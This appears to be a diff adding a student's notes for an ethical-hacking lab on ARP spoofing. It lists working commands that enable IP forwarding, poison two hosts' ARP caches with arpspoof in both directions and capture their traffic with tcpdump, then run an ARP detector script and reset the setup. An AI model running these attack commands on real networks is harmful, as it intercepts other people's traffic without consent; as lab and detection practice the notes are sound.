@@ -1,0 +1,29 @@
+TERMINAL 1
+sudo su
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t 10.159.138.139 10.159.138.193
+
+TERMINAL 2
+sudo su
+arpspoof -i eth0 -t 10.159.138.193 10.159.138.139
+
+TERMINAL 3
+sudo su
+tcpdump -i eth0
+
+
+WINDOW CMD
+cd C:\Users\Pranith\Desktop\EH
+python arp_detector.py
+
+
+Refresh:
+kali
+echo 0 > /proc/sys/net/ipv4/ip_forward
+
+cmd
+arp -d *
+
+
+python -m http.server 8080
+http://10.159.138.139:8080
